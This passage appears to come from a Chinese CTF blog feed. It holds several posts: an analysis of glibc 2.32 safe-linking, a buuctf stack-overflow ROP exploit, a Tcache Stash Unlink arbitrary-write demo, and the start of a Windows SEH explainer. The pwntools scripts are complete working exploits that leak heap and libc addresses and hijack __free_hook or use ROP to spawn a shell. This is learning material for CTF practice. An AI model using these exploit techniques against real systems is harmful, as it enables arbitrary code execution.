when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>​    在libc2.32中，tcache_put函数如下，可以发现相对于libc-2.31的代码，key的值还是赋值为tcache，但是e的next指针发生了变化，不再是下一个tcache的地址，而是引入了一个宏<code>PROTECT_PTR</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    我们找到相应的宏定义</p><p><img src="https://i.loli.net/2021/05/18/q9Xp6HOrJyRMIDQ.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br></pre></td></tr></table></figure><p>​    </p><p>​    这个宏定义就是第一个参数右移12位再和第二个参数做一次异或，也就是说e-&gt;next会指向这个值，我们在gdb中查看，发现确实变为了一个奇怪的值。</p><p><img src="https://i.loli.net/2021/05/18/gwuRz9n4ByAaslP.png" alt=""></p><p>​    我们可以来验证一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>​    第一个参数是&amp;e-&gt;next，也就是这一个位置的地址，为0x55555555a2a0，第二个参数是tcache-&gt;entries[tc_idx]，因为当前tcache的链表其实是空的（之前还没有free过chunk），所以第二个参数值为0，我们用宏定义做一个运算，将第一个参数右移12位后异或0，发现得出的值与填入e-&gt;next的值一致。</p><p><img src="https://i.loli.net/2021/05/18/Qx1azgpFm2LR3nV.png" alt=""></p><p>​    </p><p>​    执行完tcache_put函数后就return了。值得关注的是libc2.32的safe-linking机制，就是在e-&gt;next位置不再直白的插入下一块chunk的地址，而是利用了地址随机化技术，将当前地址右移后与tcache链表尾部的地址做了一次异或再插入链表尾部。</p><p>​    我们看malloc时发生了什么。</p><h4 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h4><p>​    走到这里准备单步进入malloc函数</p><p><img src="https://i.loli.net/2021/05/18/rRahfLOAGSXTsWN.png" alt=""></p><p>​    准备进入tcache_get函数</p><p><img src="https://i.loli.net/2021/05/18/wg7NEJnHoxlrzVR.png" alt=""></p><p>​    tcache_get函数源代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    与libc2.31做对比的话，libc2.31是<code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p><p>​    而libc2.32是<code>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</code></p><p>​    多了一个宏定义REVEAL_PTR，我们展开后是<code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code></p><p>​    本质还是调用了PROTECT_PTR这个宏，我们观察参数，这个宏是让ptr的地址右移后和ptr做一次异或，即可恢复出e-&gt;next</p><p>​    我们继续向后运行</p><p>​    执行那个宏之前tcache_perthread_struct中的链表的值是如图所示的值</p><p><img src="https://i.loli.net/2021/05/18/6rRutF2BqP5hywD.png" alt=""></p><p>​    执行后发生变化如图所示</p><p><img src="https://i.loli.net/2021/05/18/wpVvTKlWOfLrFXH.png" alt=""></p><p>​    完整的构成了safe-linking机制。</p><h3 id="利用手法-2"><a href="#利用手法-2" class="headerlink" title="利用手法"></a>利用手法</h3><p>​    在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，我们可以在free态的chunk中修改next为<code>(&amp;next)&gt;&gt;12 &amp; __free_hook</code>（因为我们泄露出堆基址所以可以轻松的获取到&amp;next的值），这样调用完tcache<em>get之后就可以把\</em>_free_hook链入到可供我们申请的链表当中，即可覆写__free_hook来getshell。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>​    泄露堆基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>​    泄露libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    利用UAF伪造tcache的next值，覆写__free_hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>​    完整exp如下仅供参考，由于整个程序在堆块编辑的过程中限制很宽松，大家可以自己写出更多种exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.32&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.32.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">pos, ptr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​                                                                                                                                            </p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ptmalloc2 </tag>
            
            <tag> safe-linking </tag>
            
            <tag> libc-2.32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>考点：栈溢出，ropgadget，leak libc，ubuntu18字节对齐</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo 演示</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="实例源码演示"><a href="#实例源码演示" class="headerlink" title="实例源码演示"></a>实例源码演示</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> *smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;使用此攻击手法您可以实现向任意地址写入一个大数\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.首先申请六块0x60大小的chunk，然后全部free掉使之进入tcahce bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;六块进入tcache的chunk地址为%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * <span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.在smallbin中制造出两块同样大小的chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请的一个超过tcachebin大小范围的chunk:%p,同时申请一个chunk防止此chunk free后与top chunk合并\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请一个chunk使得剩下的chunk的大小正好为0x70,随后再申请一个大于unsorted bin中的chunk,使得剩下的0x70大小的chunk进入small bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时smallbin中已经有一个chunk:%p,再来用同样的方法来构造一个\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small bin中的chunk为 %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后进入的chunk的bk为target-0x10,随后用calloc申请一个chunk,触发stash机制,完成对于向目标写入大数的攻击,达成了和unsorted bin attack同样的效果\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>直接定位到最后一步在gdb中跟踪一下</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>结构化异常处理（SEH）是Windows操作系统提供的强大异常处理功能。而Visual C++中的__<em>try{}/\</em>_finally{}和__try{}/__except{}结构本质上是对Windows提供的SEH的封装。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>线程信息块TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//异常的链表</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  <strong>Fs:[0]总是指向当前线程的TIB，其中0偏移的指向线程的异常链表，即ExceptionList是指向异常处理链表（EXCEPTION_REGISTRATION结构）的一个指针。</strong></p><p>EXCEPTION_REGISTRATION结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//指向前一个EXCEPTION_REGISTRATION的指针</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>加入SEH的代码（没加SEH代码去掉try和except结构即可）</p><figure class="highlight c++"><table><tr><td class="code"><pre><span 